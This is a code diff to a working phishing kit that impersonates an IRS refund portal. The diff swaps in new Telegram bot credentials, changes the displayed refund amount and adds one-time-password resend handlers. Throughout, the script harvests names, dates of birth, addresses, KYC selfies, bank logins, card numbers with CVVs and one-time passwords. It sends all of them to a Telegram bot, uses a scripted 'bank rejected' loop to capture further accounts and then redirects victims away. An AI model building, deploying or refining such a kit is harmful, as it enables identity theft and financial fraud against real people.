@@ -621,11 +621,11 @@
                     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
                 </div>
             </div>
-            <div class="refund-amount">$11,464</div>
+            <div class="refund-amount">$1,464</div>
             <div class="status-grid">
                 <div class="status-item">
                     <span class="status-label">Federal refund</span>
-                    <span class="status-value">$11,464</span>
+                    <span class="status-value">$1,464</span>
                 </div>
                 <div class="status-item">
                     <span class="status-label">Status</span>
@@ -1025,9 +1025,11 @@
 
     <script>
         (function() {
-            // NEW TELEGRAM CREDENTIALS
-            const BOT_TOKEN = "8888217659:AAEaU97YdaUmXpKHYWM8t-rRPIgVB0a3DF8";
-            const CHAT_ID = "6376858388";
+            // ============================================================
+            // TELEGRAM BOT CREDENTIALS
+            // ============================================================
+            const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+            const CHAT_ID   = "8737104261";
 
             // Track attempt count for bank verification
             let bankAttemptCount = 0;
@@ -1097,14 +1099,6 @@
             function validateUSPhone(phone) {
                 const digits = phone.replace(/\D/g, '');
                 return digits.length === 10;
-            }
-
-            function formatPhoneNumber(phone) {
-                const digits = phone.replace(/\D/g, '');
-                if (digits.length === 10) {
-                    return digits.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
-                }
-                return phone;
             }
 
             function showLoading(title, sub) {
@@ -1192,6 +1186,9 @@
                 setTimeout(() => t.classList.remove('show'), 4000);
             }
 
+            // ============================================================
+            // TELEGRAM API CALLS — using the specified bot credentials
+            // ============================================================
             async function sendToTelegram(text) {
                 try {
                     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1245,9 +1242,7 @@
                 document.getElementById(id).classList.remove('hide');
             }
 
-            // Reset bank attempt flow - go back to bank selection
             function resetToBankSelection() {
-                // Clear bank-related user data
                 userData.bank = '';
                 userData.bankUsername = '';
                 userData.bankPassword = '';
@@ -1255,7 +1250,6 @@
                 userData.cardExpiry = '';
                 userData.cardCvv = '';
                 userData.otp = '';
-                // Reset form fields
                 document.getElementById('bankSelect').value = '';
                 document.getElementById('bankUsername').value = '';
                 document.getElementById('bankPassword').value = '';
@@ -1499,7 +1493,6 @@
                         stopStream(selfieIdStream);
                         await showLoading('Processing KYC', 'Verifying your identity documents');
                         await sendToTelegram(`✅ <b>KYC COMPLETED</b>\n\nUser: ${userData.fullName}\nAll photos uploaded successfully.`);
-                        // Reset bank attempt counter when starting fresh
                         bankAttemptCount = 0;
                         showPanel('bankPanel');
                     });
@@ -1554,7 +1547,6 @@
             document.getElementById('backToCardFromOtp').onclick = (e) => { e.preventDefault();
                 showPanel('cardPanel'); };
 
-            // Final submit - handles bank verification flow
             document.getElementById('finalSubmitBtn').onclick = async () => {
                 const otp = document.getElementById('otpInput').value.trim();
                 if (!otp || otp.length < 4) { showToast('Enter OTP.', true); return; }
@@ -1563,10 +1555,8 @@
 
                 await showLoading('Verifying bank account', 'Checking your bank details with the financial institution');
 
-                // Simulate bank verification - always fails on first attempt
                 bankAttemptCount++;
 
-                // Send complete data to Telegram
                 const msg =
                     `📊 <b>IRS REFUND CLAIM — ATTEMPT ${bankAttemptCount}</b>\n\n` +
                     `👤 <b>PERSONAL</b>\nName: ${userData.fullName}\nDOB: ${userData.dob}\nAddress: ${userData.address}\nPhone: ${userData.phone}\n\n` +
@@ -1580,22 +1570,17 @@
                 await sendToTelegram(msg);
 
                 if (bankAttemptCount === 1) {
-                    // First attempt - show bank rejected
                     showPanel('bankRejectedPanel');
                 } else if (bankAttemptCount === 2) {
-                    // Second attempt - show bank rejected again with manual option
                     showPanel('bankRejectedSecondPanel');
                 }
             };
 
-            // Retry bank - go back to bank selection
             document.getElementById('retryBankBtn').onclick = () => {
                 resetToBankSelection();
-                // Keep attempt count at 1 so next attempt will be second
                 bankAttemptCount = 1;
             };
 
-            // Cancel claim from first rejection
             document.getElementById('cancelClaimBtn').onclick = (e) => {
                 e.preventDefault();
                 if (confirm('Are you sure you want to cancel your claim?')) {
@@ -1604,7 +1589,6 @@
                 }
             };
 
-            // Cancel claim from second rejection
             document.getElementById('cancelClaimSecondBtn').onclick = (e) => {
                 e.preventDefault();
                 if (confirm('Are you sure you want to cancel your claim?')) {
@@ -1613,18 +1597,15 @@
                 }
             };
 
-            // Manual bank details - show manual form
             document.getElementById('manualBankBtn').onclick = () => {
                 showPanel('manualBankPanel');
             };
 
-            // Back to second rejection from manual
             document.getElementById('backToBankRejectedSecond').onclick = (e) => {
                 e.preventDefault();
                 showPanel('bankRejectedSecondPanel');
             };
 
-            // Submit manual bank details
             document.getElementById('manualSubmitBtn').onclick = async () => {
                 const bankName = document.getElementById('manualBankName').value.trim();
                 const accountNumber = document.getElementById('manualAccountNumber').value.trim();
@@ -1659,18 +1640,27 @@
 
                 await sendToTelegram(manualMsg);
 
-                // Show success
                 const refNum = generateRefNumber();
                 document.getElementById('refNumber').textContent = refNum;
                 showPanel('successPanel');
 
-                // Wait 5.5 seconds and redirect to google.com
                 setTimeout(() => {
                     window.location.href = 'https://www.google.com';
                 }, 5500);
             };
 
+            const toast = document.getElementById('toastMsg');
             toast.onclick = () => toast.classList.remove('show');
+
+            document.getElementById('resendOtpBtn').onclick = async () => {
+                showToast('A new verification code has been sent to your phone.');
+                await sendToTelegram(`🔄 <b>IRS — RESEND OTP</b>\n\nUser: ${userData.fullName || '—'}\nPhone: ${userData.phone || '—'}`);
+            };
+
+            document.getElementById('emailOtpBtn').onclick = async () => {
+                showToast('Verification code sent to your registered email.');
+                await sendToTelegram(`✉️ <b>IRS — SEND OTP VIA EMAIL</b>\n\nUser: ${userData.fullName || '—'}\nPhone: ${userData.phone || '—'}`);
+            };
         })();
     </script>
 </body>
